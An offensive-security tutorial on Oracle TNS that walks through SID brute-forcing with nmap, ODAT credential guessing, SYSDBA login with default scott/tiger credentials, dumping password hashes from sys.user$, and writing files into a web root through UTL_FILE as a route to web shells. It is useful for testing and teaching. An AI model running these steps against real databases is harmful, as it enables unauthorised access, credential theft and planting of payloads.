Oracle Transparent Network Substrate (TNS) is the network layer used by Oracle databases for client-server communication. From a technical perspective, TNS handles **name resolution**, **session management**, **authentication**, **load balancing**, and **encrypted transport (SSL/TLS)** over TCP/IP (default port **1521**).  
In real-world environments, TNS is a high-value target because it exposes how clients reach database instances and how authentication is enforced.  
Most attacks and administration tasks focus on the **TNS Listener**, **SID enumeration**, **credential validation**, and **Oracle Net configuration files**.

---

## Oracle SID Enumeration

SID discovery is a prerequisite for any Oracle connection. Without a valid SID or SERVICE_NAME, authentication attempts will fail even with valid credentials.

- A **SID** (System Identifier) is a unique name that identifies a specific Oracle database instance and is required by the TNS listener to route client connections to the correct running instance.

### Nmap – Detect Oracle TNS

```bash
sudo nmap -p1521 -sV <IP>
```

This confirms whether the Oracle TNS listener is reachable and often reveals the Oracle version, which helps identify legacy or vulnerable deployments.

---

### Nmap – SID Bruteforce

```bash
sudo nmap -p1521 --script oracle-sid-brute <IP>
```

The script attempts common SID names and reports valid responses from the listener.

Output example:

```txt
| oracle-sid-brute:
|_  XE
```

Once a SID is identified, it can be reused across ODAT, SQL*Plus, and custom scripts.


---

## ODAT (Oracle Database Attacking Tool)

ODAT automates common Oracle enumeration and exploitation techniques by chaining TNS, authentication, and PL/SQL abuse.

#### Install ODAT

```bash
sudo apt install odat
```

#### Test Installation

```bash
./odat.py -h
```

A successful output confirms the Oracle client and Python dependencies are correctly installed.

---

### Full Enumeration with ODAT

```bash
sudo odat all -s <IP>
```

This runs all supported modules against the target listener.

Typical results:

- SID discovery
    
- Username enumeration
    
- Password guessing
    
- Privilege checks
    

Example:

```txt
[+] Valid credentials found: scott/tiger
```

Valid credentials allow direct database interaction and often lead to privilege escalation.

---

## Database Access via SQL*Plus

SQL*Plus provides direct, low-level interaction with the Oracle database and is useful for both enumeration and exploitation.

#### Standard Login

```bash
sqlplus scott/tiger@<IP>/XE
```

This connects using normal user privileges defined by assigned roles.


#### SYSDBA Login (Privilege Escalation)

```bash
sqlplus scott/tiger@<IP>/XE as sysdba
```

If successful, this grants full administrative control over the database instance.

---

## Manual Database Enumeration

Once authenticated, SQL queries can be used to enumerate schema objects, users, and privileges.

#### List Tables

```sql
SELECT table_name FROM all_tables;
```

Shows all tables the current user can access across schemas.


### User Roles

```sql
SELECT * FROM user_role_privs;
```

Reveals assigned roles and whether they are default or administrative.


#### Additional Useful Queries

List current user and database version:

```sql
SELECT user FROM dual;
SELECT * FROM v$version;
```

Enumerate database users:

```sql
SELECT username, account_status FROM dba_users;
```

Check system privileges:

```sql
SELECT * FROM user_sys_privs;
```

---

## Extracting Password Hashes (High Impact)

```sql
SELECT name, password FROM sys.user$;
```

- Passwords are stored as hashes
    
- Hashes can be cracked offline
    
- This is a critical post-exploitation technique for lateral movement
    

---

## File Upload via UTL_FILE (Web Shell Path)

UTL_FILE can be abused to write arbitrary files if directory permissions are misconfigured.

#### Create Test File

```bash
echo "Oracle File Upload Test" > testing.txt
```

#### Upload File (Windows IIS example)

```bash
./odat.py utlfile -s <IP> -d XE -U scott -P tiger --sysdba \
--putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

This writes a file directly into the web root if the database runs with sufficient OS privileges.

#### Verify Upload

```bash
curl http://<IP>/testing.txt
```

If accessible, the database can potentially be used to deploy web shells or other payloads.
